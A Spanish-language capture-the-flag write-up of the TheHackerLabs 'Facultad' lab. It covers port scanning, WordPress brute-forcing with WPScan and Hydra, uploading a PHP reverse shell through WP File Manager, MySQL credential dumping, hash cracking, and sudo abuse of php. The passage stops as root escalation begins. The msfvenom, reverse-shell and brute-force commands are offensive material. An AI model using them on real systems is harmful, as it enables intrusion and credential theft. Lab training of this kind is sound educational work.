---
title: "Facultad - TheHackerLabs"
date: 2025-08-21
draft: false
slug: "THL-writeup-facultad"
excerpt: "Esta es fue una máquina sencilla, pero que requiere bastante trabajo. Después de analizar los escaneos, vamos directo a la página web activa en el puerto 80. Al no encontrar nada en la página web, decidimos aplicar Fuzzing, logrando encontrar un directorio web que fue hecho con WordPress. Enumeramos dicho directorio con WPScan y al no encontrar un plugin vulnerable, aplicamos fuerza bruta, con lo que obtenemos acceso al login de WordPress. Dentro de WordPress, abusamos del plugin WP File Manager para cargar una Reverse Shell con la que ganamos acceso inicial a la máquina víctima. Dentro, descubrimos que nuestro usuario tiene privilegios de otro usuario sobre el binario php. Utilizamos la guía de GTFOBins para abusar de ese binario y logramos convertirnos en el otro usuario. Al buscar archivos pertenecientes a este usuario, encontramos uno que contiene un mensaje codificado en lenguaje Brainfuck, que al decodificarlo, descubrimos que es la contraseña de otro usuario de la máquina, que aprovechamos para autenticarnos vía SSH. Como este nuevo usuario, vemos que tiene privilegios sobre un script que puede ejecutar cualquier instrucción que le demos, pues lo modificamos para darle permisos SUID a la Bash, logrando escalar privilegios y convirtiéndonos en Root."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "SSH", "Virtual Hosting", "WordPress", "MySQL", "Web Enumeration", "Fuzzing", "Steganography", "WordPress Enumeration", "Brute Force Attack", "Abusing WordPress Plugin WP File Manager (Uploading Reverse Shell)", "MySQL Enumeration", "Cracking Hash", "Cracking WordPress Hash", "Abusing Sudoers Privileges", "Abusing Sudoers Privileges On php Binary", "Brainfuck Decoding", "Abusing Sudoers Privileges On Script", "Privesc - Abusing Sudoers Privileges On Script", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "ffuf"
  - "gobuster"
  - "echo"
  - "wpscan"
  - "hydra"
  - "wget"
  - "msfvenom"
  - "nc"
  - "find"
  - "cat"
  - "head"
  - "sed"
  - "ss"
  - "grep"
  - "mysql"
  - "JohnTheRipper"
  - "sudo"
  - "php"
  - "whoami"
  - "ssh"
  - "steghide"
  - "stegcracker"
  - "chmod"
  - "bash"
links:
  - "https://github.com/pentestmonkey/php-reverse-shell"
  - "https://gtfobins.github.io/gtfobins/php/"
  - "https://md5decrypt.net/en/Brainfuck-translator/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-facultad/facultad.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.60
PING 192.168.100.60 (192.168.100.60) 56(84) bytes of data.
64 bytes from 192.168.100.60: icmp_seq=1 ttl=64 time=1.19 ms
64 bytes from 192.168.100.60: icmp_seq=2 ttl=64 time=1.65 ms
64 bytes from 192.168.100.60: icmp_seq=3 ttl=64 time=1.04 ms
64 bytes from 192.168.100.60: icmp_seq=4 ttl=64 time=0.780 ms

--- 192.168.100.60 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3020ms
rtt min/avg/max/mdev = 0.780/1.162/1.647/0.315 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.60 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 13:27 CST
Initiating ARP Ping Scan at 13:27
Scanning 192.168.100.60 [1 port]
Completed ARP Ping Scan at 13:27, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:27
Scanning 192.168.100.60 [65535 ports]
Discovered open port 22/tcp on 192.168.100.60
Discovered open port 80/tcp on 192.168.100.60
Completed SYN Stealth Scan at 13:27, 6.16s elapsed (65535 total ports)
Nmap scan report for 192.168.100.60
Host is up, received arp-response (0.00094s latency).
Scanned at 2025-08-21 13:27:51 CST for 6s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.38 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 2 puertos abiertos y supongo que la intrusión será por la página web activa del **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.100.60 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 13:28 CST
Nmap scan report for 192.168.100.60
Host is up (0.0010s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)

| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))

|_http-title: Asignatura: Administraci\xC3\xB3n de Sistemas - Ingenier\xC3\xADa Inform\xC3\xA1...
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.36 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Interesante, el escaneo muestra que la página web tiene contenido, más no es solo la página por defecto de **Apache2**.

Vamos a verla.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-facultad/Captura1.png">
</p>

Parece ser una página web de una escuela.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-facultad/Captura2.png">
</p>

No hay mucho que destacar.

Tampoco encontraremos algo si revisamos el código fuente.

Apliquemos **Fuzzing** para ver si encontramos un directorio web oculto.

### Fuzzing {#fuzz}

Primero usaremos la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.100.60/FUZZ/ -t 300

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.60/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 200, Size: 948, Words: 61, Lines: 17, Duration: 7ms]
education               [Status: 200, Size: 49880, Words: 1395, Lines: 338, Duration: 6521ms]
icons                   [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 7981ms]
                        [Status: 200, Size: 4651, Words: 1607, Lines: 178, Duration: 33ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 27ms]
:: Progress: [220545/220545] :: Job [1/1] :: 245 req/sec :: Duration: [0:01:42] :: Errors: 5 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.100.60/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.60/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> http://192.168.100.60/images/]
/education            (Status: 301) [Size: 322] [--> http://192.168.100.60/education/]
/server-status        (Status: 403) [Size: 280]
Progress: 220545 / 220546 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Encontramos algunos directorios, pero el que nos interesa es el llamado `/education`:

<p align="center">
<img src="/assets/images/THL-writeup-facultad/Captura3.png">
</p>

Es una página hecha con **WordPress**, pero no está cargando bien.

Haciendo un poco de **Hoovering**, vemos un dominio:

<p align="center">
<img src="/assets/images/THL-writeup-facultad/Captura4.png">
</p>

Entonces, se está aplicando **Virtual Hosting**.

Registralo en el `/etc/hosts`:
```bash
echo "192.168.100.60 facultad.thl" >> /etc/hosts
```
Ya debería verse bien.

### Enumeración de Página Web Hecha en WordPress con WPScan {#WPScan}

Dentro de la página, solamente vemos una publicación que hizo un usuario llamado **Facultad**:

<p align="center">
<img src="/assets/images/THL-writeup-facultad/Captura5.png">
</p>

Si revisamos su perfil, parece que es un usuario administrador por el ID que se le asignó y que podemos ver en la URL:

<p align="center">
<img src="/assets/images/THL-writeup-facultad/Captura6.png">
</p>

Probemos con **WPScan** para encontrar algún plugin vulnerable:
```bash
wpscan --url http://facultad.thl/education --enumerate ap --plugins-detection aggressive --no-banner
[+] URL: http://facultad.thl/education/ [192.168.100.60]
[+] Started: Thu Aug 21 13:52:37 2025

Interesting Finding(s):

[+] Headers

 | Interesting Entry: Server: Apache/2.4.62 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://facultad.thl/education/xmlrpc.php

 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
...
[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:02:18 <========================================================================================================> (112225 / 112225) 100.00% Time: 00:02:18
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet

 | Location: http://facultad.thl/education/wp-content/plugins/akismet/
 | Latest Version: 5.5
 | Last Updated: 2025-07-15T18:17:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://facultad.thl/education/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] wp-file-manager

 | Location: http://facultad.thl/education/wp-content/plugins/wp-file-manager/
 | Last Updated: 2025-06-04T11:21:00.000Z
 | Readme: http://facultad.thl/education/wp-content/plugins/wp-file-manager/readme.txt
 | [!] The version is out of date, the latest version is 8.0.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://facultad.thl/education/wp-content/plugins/wp-file-manager/, status: 200
 |
 | Version: 8.0.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://facultad.thl/education/wp-content/plugins/wp-file-manager/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://facultad.thl/education/wp-content/plugins/wp-file-manager/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Aug 21 13:55:09 2025
[+] Requests Done: 112264
[+] Cached Requests: 9
[+] Data Sent: 32.182 MB
[+] Data Received: 15.19 MB
[+] Memory used: 447.922 MB
[+] Elapsed time: 00:02:32
```

| Parámetros | Descripción |
|---|---|
| *--url*    | Para indicar la URL a escanear. |
| *--enumerate* | Indicando que aplique enumeración, puede ser de usuarios (`u`), de plugins vulnerables (`vp`), de todos los plugins (`ap`), etc. |
| *--plugins-detection* | Para indicar un modo de detección de plugins, se puede elegir entre `passive` (pasivo), `mixed` (mixto) y `agressive` (agresivo). |
| *--no-banner* | Para no mostrar el banner de la herramienta. |

Encontramos un plugin vulnerable, pero no encontré un Exploit para esa versión del **plugin wp-file-manager**.

Podemos intentar aplicar fuerza bruta al **usuario Facultad**, usando **WPScan** y aprovechando que está activo el **XML-RPC**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta a Login de WordPress con WPScan e Hydra {#FuerzaBruta}

Utilicemos al **usuario Facultad** y enfoquemos el ataque para que use el **XML-RPC** de **WordPress**:
```bash
wpscan --url http://facultad.thl/education --password-attack xmlrpc -t 20 -U 'Facultad' -P /usr/share/wordlists/rockyou.txt --no-banner
...
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - Facultad / asdfghjkl                                                                                                                                                              
Trying Facultad / teresa Time: 00:00:06 <                                                                                                             > (420 / 14344812)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:

 | Username: Facultad, Password: asdfghjkl

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Aug 21 14:18:47 2025
[+] Requests Done: 559
[+] Cached Requests: 36
[+] Data Sent: 265.773 KB
[+] Data Received: 273.063 KB
[+] Memory used: 276.258 MB
[+] Elapsed time: 00:00:15
```

| Parámetros | Descripción |
|---|---|
| *--password-attack* | Para elegir un ataque suministrado en lugar de determinar uno automáticamente. Puede ser `wp-login, xmlrpc, xmlrpc-multicall`|
| *-t*       | Indica la cantidad de hilos a usar. |
| *-U*	     | Indica una lista de usuarios o un usuario. |
| *-P*	     | Indica un wordlist de contraseñas. |

Muy bien, obtuvimos la contraseña.

Ya lo hicimos con **WPScan**, ahora probemos con **hydra**:
```bash
hydra -l 'facultad' -P /usr/share/wordlists/rockyou.txt 192.168.100.60 http-post-form "/education/wp-login.php:log=^USER^&pwd=^PASS^:S=302"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-21 14:50:41
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.100.60:80/education/wp-login.php:log=^USER^&pwd=^PASS^:S=302
[80][http-post-form] host: 192.168.100.60   login: facultad   password: asdfghjkl
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-21 14:50:57
```
Genial, obtuvimos de nuevo la contraseña.

Entra al login de **WordPress** en la ruta `/wp-login.php` o `/wp-admin` y utiliza las credenciales que tenemos para entrar:

<p align="center">
<img src="/assets/images/THL-writeup-facultad/Captura7.png">
</p>

Estamos dentro.

### Usando Plugin WP File Manager para Obtener una Reverse Shell desde WordPress {#revShell}

Vamos a utilizar el **plugin WP File Manager** para cargar una **Reverse Shell** que podamos utilizar en cualquier momento.

Puedes utilizar la **Reverse Shell** de **Pentestmonkey**:
* <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">Repositorio de pentestmonkey: php-reverse-shell</a>

Y la puedes descargar con **wget**:
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
```

Recuerda que debes modificarla para agregar tu IP y el puerto a usar:
```bash
set_time_limit (0);
$VERSION = "1.0";
$ip = 'Tu_IP';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;
```

O también puedes crear tu propia **Reverse Shell** con **msfvenom**:
```bash
msfvenom -p php/reverse_php LHOST=Tu_IP LPORT=puerto_random -f raw > reverse.php
```
En mi caso, usaré la **Reverse Shell** de **Pentestmonkey**.

Ahora ve al plugin de **WP File Manager** y puedes subirlo de dos formas:

* Puedes crear una carpeta nueva, subir ahí el archivo y deberías poder visitar ese directorio:

<p align="center">
<img src="/assets/images/THL-writeup-facultad/Captura8.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-facultad/Captura9.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-facultad/Captura10.png">
</p>

* Puedes subirla directamente en el directorio principal o uno donde tengas permisos:

<p align="center">
<img src="/assets/images/THL-writeup-facultad/Captura11.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-facultad/Captura12.png">
</p>

Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```
Entra a la **Reverse Shell** que ya cargaste al **WordPress**.

Y observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.60] 43740
Linux TheHackersLabs-facultad.thl 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64 GNU/Linux
 22:29:35 up  1:10,  0 user,  load average: 0.00, 0.05, 0.11
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (542): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheHackersLabs-facultad:/$ whoami
whoami
www-data
```
Estamos dentro.

## Post Explotación {#Post}

### Opcional: Enumeración de Servicio MySQL y Crackeo de Contraseña de WordPress {#Opcional}

Al ganar acceso a la máquina víctima, entramos a la raíz.

Pero si listamos el directorio `/var/www/html/education`, veremos los archivos de **WordPress** y entre ellos el **wp-config.php**. Aunque es más fácil y práctico buscarlo con el comando **find**:
```bash
www-data@TheHackersLabs-facultad:/$ find / -type f -name "wp-config.php" 2>/dev/null
/var/www/html/education/wp-config.php
```

Al leerlo, es posible que encontremos las credenciales de acceso para el **servicio MySQL**:
```bash
www-data@TheHackersLabs-facultad:/$ cat /var/www/html/education/wp-config.php | head -n 40 | sed -n '/\/\*\* The name of the database for WordPress \*\//,$p'
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wordpressuser' );

/** Database password */
define( 'DB_PASSWORD', 'tu_contraseña_segura' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
```

Podemos comprobar con el comando **ss** si está activo el **puerto 3306**, que es el puerto asignado para **MySQL**:
```bash
www-data@TheHackersLabs-facultad:/$ ss -tuln | grep tcp
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*          
tcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*          
tcp   LISTEN 0      511                *:80              *:*          
tcp   LISTEN 0      128             [::]:22           [::]:*
```
Ahí está.

Usemos las credenciales obtenidas para entrar al **servicio MySQL**:
```bash
www-data@TheHackersLabs-facultad:/$ mysql -h localhost -u 'wordpressuser' -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
...
MariaDB [(none)]>
```
Entramos.

Veamos qué bases de datos existen:
```bash
MariaDB [(none)]> show databases;
+--------------------+

| Database           |
+--------------------+

| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0.000 sec)
```
Ahí está la BD de **WordPress**.

Usemos esa BD y veamos qué tablas existen:
```bash
MariaDB [(none)]> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]> show tables;
+-----------------------+

| Tables_in_wordpress   |
+-----------------------+

| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
| wp_wpfm_backup        |
+-----------------------+
13 rows in set (0.000 sec)
```

En la tabla **wp_users**, encontraremos los usuarios registrados y sus contraseñas encriptadas dentro de un hash:
```bash
MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+------------+-------------------------------+---------------------+---------------------+-------------+--------------+

| ID | user_login | user_pass                          | user_nicename | user_email | user_url                      | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+------------+-------------------------------+---------------------+---------------------+-------------+--------------+

|  1 | Facultad   | $P$BErY/zc8BR4TJBrKLWcxOwJuU6UrOY/ | facultad      | a@a.com    | http://facultad.thl/education | 2025-01-27 10:25:10 |                     |           0 | Facultad     |
+----+------------+------------------------------------+---------------+------------+-------------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.000 sec)
```

Podemos copiar ese hash, guardarlo en nuestra máquina y crackearlo con **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash --format=phpass
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
asdfghjkl        (?)     
1g 0:00:00:00 DONE (2025-08-21 15:08) 14.28g/s 8228p/s 8228c/s 8228C/s adidas..parola
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```
Excelente, pudimos crackear su contraseña.

**OJO**: Este crackeo no siempre funciona, así que ve preparado por si no logras crackear la contraseña.

### Enumeración de la Máquina Víctima y Abusando de Permisos Sudoers sobre Binario php {#lineEnum}

Veamos qué usuarios existen en la máquina:
```bash
www-data@TheHackersLabs-facultad:/$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
gabri:x:1001:1001::/home/gabri:/bin/sh
vivian:x:1002:1002::/home/vivian:/bin/sh
```

Podemos encontrar sus directorios en el directorio `/home`:
```bash
www-data@TheHackersLabs-facultad:/$ ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Jan 27  2025 .
drwxr-xr-x 18 root   root   4096 Oct 16  2024 ..
drwx------  2 debian debian 4096 Oct 16  2024 debian
drwxr-xr-x  3 vivian vivian 4096 Aug 21 23:07 vivian
```
Falta el directorio del **usuario gabri**, pero podemos entrar y ver el contenido del directorio de **vivian**.

Ahí encontraremos la flag del usuario:
```bash
www-data@TheHackersLabs-facultad:/$ ls -la /home/vivian/
total 16
drwxr-xr-x 3 vivian vivian 4096 Aug 21 23:07 .
drwxr-xr-x 4 root   root   4096 Jan 27  2025 ..
drwxr-xr-x 3 vivian vivian 4096 Aug 21 23:07 .local
-rw-r--r-- 1 root   root     23 Jan 27  2025 user.txt
www-data@TheHackersLabs-facultad:/$ cat /home/vivian/user.txt
...
```

Además, en el directorio `/opt` encontraremos un directorio que contiene un script que solo da un saludo:
```bash
www-data@TheHackersLabs-facultad:/$ ls -la /opt/vivian/
total 12
drwxr-xr-x 2 vivian vivian 4096 Aug 21 23:07 .
drwxr-xr-x 3 root   root   4096 Jan 25  2025 ..
-rwxr-xr-x 1 vivian vivian   66 Aug 21 23:07 script.sh
```

Este script le pertenece al **usuario vivian** y cualquiera puede modificarlo y ejecutarlo:
```bash
www-data@TheHackersLabs-facultad:/$ cat /opt/vivian/script.sh 
#!/bin/bash

echo "Ejecutado como vivian para mis alumnos"
www-data@TheHackersLabs-facultad:/$ ./opt/vivian/script.sh 
Ejecutado como vivian para mis alumnos
```
Solo muestra un saludo cuando lo ejecutemos.

Por último, podemos revisar qué privilegios tiene nuestro usuario:
```bash
www-data@TheHackersLabs-facultad:/$ sudo -l
sudo: unable to resolve host TheHackersLabs-facultad.thl: Name or service not known
Matching Defaults entries for www-data on TheHackersLabs-facultad:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on TheHackersLabs-facultad:
    (gabri) NOPASSWD: /usr/bin/php
```
Podemos usar el **binario php** con privilegios del **usuario gabri**.

En la **guía de GTFOBins**, encontraremos una forma en la que podemos abusar de este binario para escalar privilegios, que en este caso sería para convertirnos en el **usuario gabri**:
* <a href="https://gtfobins.github.io/gtfobins/php/" target="_blank">GTFOBins: php</a>

Utilizaremos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-facultad/Captura13.png">
</p>

Ejecutémoslo:
```bash
www-data@TheHackersLabs-facultad:/$ CMD="/bin/bash"
www-data@TheHackersLabs-facultad:/$ sudo -u gabri php -r "system('$CMD');"
sudo: unable to resolve host TheHackersLabs-facultad.thl: Name or service not known
gabri@TheHackersLabs-facultad:/$ 
gabri@TheHackersLabs-facultad:/$ whoami
gabri
```
Nos convertimos en el **usuario gabri**.

### Buscando Archivos del Usuario gabri, Decodificando Mensaje en Lenguaje Brainfuck y Ganando Acceso como Usuario vivian vía SSH {#gabri}

Recordemos que no encontramos ningún archivo o directorio perteneciente al **usuario gabri**.

Podemos buscarlos con el comando **find**:
```bash
gabri@TheHackersLabs-facultad:/$ find / -user gabri 2>/dev/null
/dev/pts/1
/var/mail/gabri
/var/mail/gabri/.password_vivian.bf
/proc/2382
/proc/2382/task
/proc/2382/task/2382
/proc/2382/task/2382/fd
...
```

Al principio de la búsqueda, encontramos un archivo llamado **.password_vivian.bf** y si lo leemos, veremos que tiene un mensaje codificado en **lenguaje Brainfuck**:
```bash
gabri@TheHackersLabs-facultad:/$ cat /var/mail/gabri/.password_vivian.bf
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>++++++++.-----------.+++++++++++++++.---------------.+++++++++++++++++++.--.---.-.-------------.<<++++++++++++++++++++.--.++.+++.
```

Lo podemos decodificar con la siguiente página web:
* <a href="https://md5decrypt.net/en/Brainfuck-translator/" target="_blank">Brainfuck Translator</a>

Observa el mensaje que obtuvimos:

<p align="center">
<img src="/assets/images/THL-writeup-facultad/Captura14.png">
</p>

Parece ser una contraseña y el archivo tiene el nombre del **usuario vivian**, entonces, es posible que sea su contraseña.

Comprobémoslo desde nuestra sesión actual o entrando al **servicio SSH** con ese usuario y contraseña:
```bash
ssh vivian@192.168.100.60
vivian@192.168.100.60's password: 
Linux TheHackersLabs-facultad.thl 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
...
Last login: Mon Jan 27 22:29:26 2025
$ whoami
vivian
$ bash -i
vivian@TheHackersLabs-facultad:~$
```
Estamos dentro y ahora somos **vivian**.

Como curiosidad, cuando aplicamos **Fuzzing**, vimos la existencia del directorio `/images` que contiene una imagen que puedes descargar.

Pues si analizamos dicha imagen y utilizamos **steghide o stegcracker**, encontraremos un archivo de texto oculto:
```bash
# Usando steghide (No tiene ninguna contraseña)
steghide extract -sf facultad.jpg
Anotar salvoconducto: 
anot� los datos extra�dos e/"mensaje.txt".

# Usando stegcracker
stegseek facultad.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "mensaje.txt".
[i] Extracting to "facultad.jpg.out".
```

Al leerlo, nos daba una pista de dónde encontrar la contraseña del **usuario vivian**:
```bash
cat mensaje.txt
Hola Gabri, 
se me ha olvidado la contraseña creo que te la pasé y la tienes en tu correo.
Vivian
```
Continuemos.

### Escalando Privilegios Abusando de Permisos Sudoers sobre Script de Usuario vivian {#Script}

Como tenemos la contraseña de **vivian**, podemos ver si tiene algún privilegio:
```bash
vivian@TheHackersLabs-facultad:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-facultad.thl: Nombre o servicio desconocido
Matching Defaults entries for vivian on TheHackersLabs-facultad:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User vivian may run the following commands on TheHackersLabs-facultad:
    (ALL) NOPASSWD: /opt/vivian/script.sh
```
Resulta que ese simple script tiene privilegios totales, ósea, que podemos modificarlo para que realice acciones como si fuera el **Root**.

Se me ocurren dos cosas:
